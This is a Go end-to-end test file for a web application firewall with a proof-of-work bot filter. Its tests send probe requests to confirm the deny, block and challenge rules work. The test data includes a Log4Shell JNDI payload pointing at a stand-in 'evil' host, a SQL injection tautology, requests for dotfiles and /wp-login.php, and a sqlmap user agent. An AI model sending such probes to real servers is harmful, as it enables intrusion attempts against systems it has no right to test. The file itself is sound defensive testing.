// Angie Guardian — WAF + proof-of-work bot firewall for Angie.
// Copyright (C) 2026 Melroy van den Berg
// SPDX-License-Identifier: AGPL-3.0-or-later

//go:build e2e

package e2e

import (
	"net/http"
	"strings"
	"testing"
)

// The shared WAF rules under test are defined in
// deploy/docker/rules-common.yaml, while api.localhost appends
// deploy/docker/rules-api.yaml:
//   api-json-allow allow  application/vnd.guardian.e2e+json in Accept (API)
//   api-client-fallback deny all other API requests                       (API)
//   wp-cms-probe      deny   /wp-login.php ...
//   dotfile-probe block  /.env /.git/ ...
//   sqli-tautology    challenge  UNION SELECT / ' or 1=1 ...
//   scanner-ua    block  sqlmap nikto ...
//   log4shell     block  ${jndi: in query/ua/referer/x-forwarded-for
//   trace-method  deny   methods TRACE, TRACK
//
// Every request from the test host shares the Docker gateway source IP, so a
// `block` action places a behavioural block on that IP. Tests that trigger a
// block clear it afterwards (t.Cleanup → clearGatewayBlocks) so they don't
// poison later assertions.

// TestWAFAllowAction confirms common rules run before domain additions, while
// an API allow matched through a named Accept header still wins over the later
// API fallback deny and reaches the backend directly.
func TestWAFAllowAction(t *testing.T) {
	t.Cleanup(clearGatewayBlocks)
	clearGatewayBlocks()

	// common.yaml runs first, so the API allow cannot bypass its dotfile rule.
	resp := get(t, "/.env", apiRulesHost, "api-client/1.0", map[string]string{
		"Accept": "text/plain, Application/Vnd.Guardian.E2E+JSON; Charset=UTF-8",
	})
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("common rule before API allow: status %d, want 403", resp.StatusCode)
	}
	clearGatewayBlocks()

	resp = get(t, "/v1/items", apiRulesHost, "api-client/1.0", map[string]string{
		"Accept": "text/plain, Application/Vnd.Guardian.E2E+JSON; Charset=UTF-8",
	})
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("API allow before fallback: status %d, want 200", resp.StatusCode)
	}
	if r := get(t, "/v1/items", apiRulesHost, "api-client/1.0", nil); r.StatusCode != http.StatusForbidden {
		t.Fatalf("API fallback without allowed Accept: status %d, want 403", r.StatusCode)
	}
}

// TestWAFRuleDeny confirms a `deny` rule (wp-cms-probe) returns Angie's 403
// denied page and does NOT place a behavioural block (deny != block).
func TestWAFRuleDeny(t *testing.T) {
	t.Cleanup(clearGatewayBlocks) // defensive; a deny shouldn't block, but be safe

	resp := get(t, "/wp-login.php", powHost, "curl/8.0", nil)
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("/wp-login.php: status %d, want 403", resp.StatusCode)
	}
	// A follow-up unrelated request from the same IP still gets through, proof
	// the deny did not blanket-block the source IP.
	clearGatewayBlocks()
	if r := get(t, "/robots.txt", powHost, "curl/8.0", nil); r.StatusCode != http.StatusOK {
		t.Fatalf("benign request after a deny: status %d, want 200 (deny must not block the IP)", r.StatusCode)
	}
}

// TestWAFInstantBlock confirms a `block` rule (dotfile-probe on /.env) both
// denies the request AND places a behavioural block on the source IP: a
// subsequent benign request from the same IP is then denied until the block is
// cleared.
func TestWAFInstantBlock(t *testing.T) {
	t.Cleanup(clearGatewayBlocks)
	clearGatewayBlocks() // start clean

	// The block probe.
	resp := get(t, "/.env", powHost, "curl/8.0", nil)
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("/.env: status %d, want 403", resp.StatusCode)
	}

	// The admin API now reports the source (gateway) IP as blocked, with the
	// rule as the reason.
	ip, reason := findBlockedGateway(t)
	if ip == "" {
		t.Fatal("/.env did not place a behavioural block on the source IP")
	}
	if !strings.Contains(reason, "dotfile-probe") {
		t.Errorf("block reason = %q, want it to mention the dotfile-probe rule", reason)
	}

	// While blocked, an otherwise-benign request from the same IP is denied.
	if r := get(t, "/some-benign-page", powHost, "curl/8.0", nil); r.StatusCode != http.StatusForbidden {
		t.Fatalf("benign request while blocked: status %d, want 403", r.StatusCode)
	}

	// Clearing the block via the admin API restores access.
	clearGatewayBlocks()
	if r := get(t, "/robots.txt", powHost, "curl/8.0", nil); r.StatusCode != http.StatusOK {
		t.Fatalf("after unblock: status %d, want 200", r.StatusCode)
	}
}

// TestWAFScannerUABlock confirms a `block` rule matched on the User-Agent
// (scanner-ua: sqlmap) denies and blocks.
func TestWAFScannerUABlock(t *testing.T) {
	t.Cleanup(clearGatewayBlocks)
	clearGatewayBlocks()

	resp := get(t, "/", powHost, "sqlmap/1.7", nil)
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("sqlmap UA: status %d, want 403", resp.StatusCode)
	}
	if ip, reason := findBlockedGateway(t); ip == "" {
		t.Error("sqlmap UA did not place a behavioural block")
	} else if !strings.Contains(reason, "scanner-ua") {
		t.Errorf("block reason = %q, want scanner-ua", reason)
	}
}

// TestWAFHeaderRule confirms a header-targeting rule fires through real Angie:
// the auth subrequest inherits the client's request headers, so a Log4Shell
// probe hidden in the Referer (log4shell rule, header:referer target) is
// denied and the source IP blocked, even though path, query and UA are clean.
func TestWAFHeaderRule(t *testing.T) {
	t.Cleanup(clearGatewayBlocks)
	clearGatewayBlocks()

	resp := get(t, "/products", powHost, "curl/8.0",
		map[string]string{"Referer": "https://example.com/?x=${jndi:ldap://evil/a}"})
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("jndi referer: status %d, want 403", resp.StatusCode)
	}
	if ip, reason := findBlockedGateway(t); ip == "" {
		t.Error("jndi referer did not place a behavioural block")
	} else if !strings.Contains(reason, "log4shell") {
		t.Errorf("block reason = %q, want log4shell", reason)
	}
}

// TestWAFMethodRule confirms a methods-only rule fires through real Angie via
// the X-Guardian-Method relay (the auth subrequest itself is always a GET).
// TRACK is used because Angie rejects TRACE at parse time with its own 405
// before Guardian ever sees it; TRACK is not special-cased and passes through.
func TestWAFMethodRule(t *testing.T) {
	t.Cleanup(clearGatewayBlocks)

	h := map[string]string{"Host": powHost, "User-Agent": "curl/8.0"}
	resp := req(t, "TRACK", site+"/anything", h, nil)
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("TRACK: status %d, want 403 (trace-method rule)", resp.StatusCode)
	}
	// The same URL with a normal method is untouched (deny, not block).
	clearGatewayBlocks()
	if r := get(t, "/anything", powHost, "curl/8.0", nil); r.StatusCode != http.StatusOK {
		t.Fatalf("GET after TRACK deny: status %d, want 200", r.StatusCode)
	}
}

// TestWAFChallengeAction confirms a `challenge` rule (sqli-tautology) forces a PoW
// challenge rather than an outright deny on a PoW-enabled host: a softer
// response that spares false positives. It also proves the difficulty relay
// works through real Angie: the escalated difficulty from the auth decision
// (base + 4 bits for a rule hit) must reach the issued challenge via
// auth_request_set + X-Guardian-Difficulty, not fall back to base.
func TestWAFChallengeAction(t *testing.T) {
	t.Cleanup(clearGatewayBlocks)

	// A SQLi-shaped query on the PoW host. The sqli-tautology rule's action is
	// `challenge`, so the browser is diverted to the interstitial (200 HTML),
	// not denied.
	ch := fetchChallenge(t, "/search?q="+urlEscape("' or 1=1"), powHost, browserUA)
	// guardian.e2e.yaml: base_difficulty 4 = 16 bits; rule escalation
	// adds one full step (4 bits).
	if ch.Difficulty != 20 {
		t.Fatalf("rule challenge difficulty = %d bits, want escalated 20 (base 16 + 4)", ch.Difficulty)
	}
}

// TestPerDomainPolicy confirms per-domain config is honoured through Angie: on
// the PoW-disabled host (api.localhost) a browser UA is NOT challenged (WAF
// only, no interstitial a machine client can't solve), yet a WAF rule
// still denies. This proves the domain merge reaches the live decision.
func TestPerDomainPolicy(t *testing.T) {
	t.Cleanup(clearGatewayBlocks)

	// Browser UA on the WAF-only host: no challenge, reaches the backend.
	resp := get(t, "/browse", wafOnlyHost, browserUA, nil)
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("browser UA on WAF-only host: status %d, want 200 (no PoW)", resp.StatusCode)
	}
	if body := bodyOf(t, resp); strings.Contains(body, "guardian-data") {
		t.Fatal("WAF-only host must not serve a PoW interstitial")
	}

	// A WAF `deny` rule still fires on the same host.
	if r := get(t, "/wp-login.php", wafOnlyHost, "curl/8.0", nil); r.StatusCode != http.StatusForbidden {
		t.Fatalf("rule on WAF-only host: status %d, want 403", r.StatusCode)
	}
}

// TestWAFDisabledRuleID: wp.localhost shares the common rules file but
// disables wp-cms-probe by exact id (guardian.e2e.yaml, issue #27). The probe
// path reaches the backend there, the rest of the shared file still applies
// on the same host, and wp-cms-probe keeps firing on hosts that do not exclude
// it: one file on disk, different effective rule sets per scope.
func TestWAFDisabledRuleID(t *testing.T) {
	t.Cleanup(clearGatewayBlocks)
	clearGatewayBlocks() // start clean

	if r := get(t, "/wp-login.php", wpHost, "curl/8.0", nil); r.StatusCode != http.StatusOK {
		t.Fatalf("/wp-login.php on %s: status %d, want 200 (wp-cms-probe disabled by id)", wpHost, r.StatusCode)
	}
	// The rest of the shared file still applies on the excluding host.
	if r := get(t, "/.env", wpHost, "curl/8.0", nil); r.StatusCode != http.StatusForbidden {
		t.Fatalf("/.env on %s: status %d, want 403 (dotfile-probe must stay active)", wpHost, r.StatusCode)
	}
	clearGatewayBlocks() // dotfile-probe is a block action; unpoison the gateway IP
	// And the excluded rule still fires on a host without the exclusion.
	if r := get(t, "/wp-login.php", wafOnlyHost, "curl/8.0", nil); r.StatusCode != http.StatusForbidden {
		t.Fatalf("/wp-login.php on %s: status %d, want 403 (wp-cms-probe active)", wafOnlyHost, r.StatusCode)
	}
}

// urlEscape is a tiny query-value escaper (avoids importing net/url just for a
// couple of characters used in the SQLi probe).
func urlEscape(s string) string {
	r := strings.NewReplacer(" ", "%20", "'", "%27", "=", "%3D")
	return r.Replace(s)
}
